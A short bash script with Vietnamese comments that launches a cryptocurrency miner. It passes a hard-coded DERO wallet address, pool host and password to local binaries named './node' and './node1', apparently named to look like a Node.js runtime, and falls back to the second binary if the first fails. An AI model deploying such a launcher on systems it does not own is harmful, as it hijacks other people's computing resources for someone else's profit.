#!/bin/bash

# Đặt thông tin mặc định
WALLET="deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqextxqgv3qaljzwm"
POOL="community-pools.mysrv.cloud:10300"
PASSWORD="rpc"

# Cấp quyền thực thi cho ./node và ./node1
chmod +x ./node
chmod +x ./node1

# Thực thi lệnh với ./node
./node -w "$WALLET" -r "$POOL" -p "$PASSWORD"

# Nếu lệnh trên lỗi, chuyển sang ./node1
if [ $? -ne 0 ]; then
    echo "./node failed. Switching to ./node1..."
    ./node1 -w "$WALLET" -r "$POOL" -p "$PASSWORD"

    # Kiểm tra nếu ./node1 cũng lỗi
    if [ $? -ne 0 ]; then
        echo "Both ./node and ./node1 failed to execute."
        exit 1
    fi
fi
